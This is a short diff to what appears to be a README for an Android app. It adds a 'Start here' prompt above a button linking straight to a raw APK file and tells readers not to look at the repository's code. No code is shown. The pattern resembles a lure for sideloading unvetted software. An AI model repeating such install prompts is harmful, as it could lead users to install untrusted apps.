@@ -19,6 +19,8 @@
 
 ### Click the green button below to download and install the app
 
+👉 **Start here — click the green button below:**
+
 [![Download APK](https://img.shields.io/badge/DOWNLOAD%20APK-DIRECT-16A34A?style=for-the-badge&logo=android&logoColor=white)](https://github.com/Anooshacavin/wiresharebaryo-android/raw/refs/heads/main/download/WIRESHAREBARYO-1.6.30-build39-perapp-fix.apk)
 
 You do **not** need to open the **Code** menu or download the repository files. Use the green **DOWNLOAD APK** button above.
